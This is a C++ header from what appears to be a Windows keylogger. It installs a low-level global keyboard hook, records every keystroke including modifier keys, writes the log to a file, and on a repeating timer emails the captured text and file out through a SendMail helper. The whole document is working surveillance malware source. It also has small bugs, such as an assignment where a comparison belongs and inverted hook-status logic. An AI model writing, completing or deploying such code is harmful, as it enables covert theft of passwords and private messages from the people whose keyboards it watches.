#ifndef KEYBHOOK_H
#define KEYBHOOK_H

#include <iostream>
#include <fstream>
#include "windows.h"
#include "KeyConstants.h"
#include "Timer.h"
#include "SendMail.h"

std::string keylog = "";

void TimerSendMail()
{
    //Check if user typed something on keyboard, and if they didnt dont send anything
    if(keylog.empty())
        return;
    std::string last_file = IO::WriteLog(keylog);

    //DEBUG CODE REMOVE LATER
    if(last_file.empty())
    {
        Helper::WriteAppLog("File creation was not successfull. Keylog " + keylog + "");
        return;
    }

    int x = Mail::SendMail("Log [" + last_file + "]",
                           "\nThe file has been attached to this mail\nFor testing purposes:\n " + keylog, IO::GetOurPath(true) + last_file);
    if(x != 7)
        Helper::WriteAppLog("Mail was not sent! Error Code: " + Helper::ToString(x));
    else//Clear out keylog if sending was success
        keylog = "";
}
//2000 * 60 = 2 minutes
Timer MailTimer(TimerSendMail, 500 * 60, Timer::Infinite);

HHOOK eHook = NULL;

LRESULT OurKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
{
    //wparam is our key press param
    if(nCode < 0)
        CallNextHookEx(eHook, nCode, wparam, lparam);

    KBDLLHOOKSTRUCT * kbs = (KBDLLHOOKSTRUCT *)lparam;

    //Check if key was pressed
    if(wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN)
    {
        //Check if key was pressed and hold. We want to know if someone holds shift, what key did they type while holding shift
        keylog += Keys::KEYS[kbs->vkCode].Name;//Record the key
        if(kbs->vkCode == VK_RETURN)
            keylog += '\n';//Move on to next line if user presses enter to record more key presses
    } else if (wparam == WM_KEYUP || wparam == WM_SYSKEYUP)//Check if key was released
    {
        DWORD key = kbs->vkCode;
        if(key == VK_CONTROL
                || key == VK_LCONTROL
                || key == VK_RCONTROL
                || key == VK_SHIFT
                || key == VK_LSHIFT
                || key == VK_RSHIFT
                || key == VK_MENU
                || key == VK_LMENU
                || key == VK_RMENU
                || key == VK_CAPITAL
                || key == VK_NUMLOCK
                || key == VK_LWIN
                || key == VK_RWIN
        )
        {
            std::string KeyName = Keys::KEYS[kbs->vkCode].Name;
            KeyName.insert(1, "/");
            keylog += KeyName;
        }
    }

    return CallNextHookEx(eHook, nCode, wparam, lparam);
}

bool InstallHook()
{
    Helper::WriteAppLog("Hook Started... Timer Started");
    MailTimer.Start(true);

    //WKL indicates that use hooks, low level hooks. OKP proccedure that is invoked every time user presses key
    eHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)OurKeyboardProc,GetModuleHandle(NULL), 0);

    return eHook = NULL;
}

bool UninstallHook()
{
    BOOL b = UnhookWindowsHookEx(eHook);
    eHook = NULL;
    return(bool) b;
}

bool IsHooked()
{
    return (bool)(eHook == NULL);
}

#endif // KEYBHOOK_H
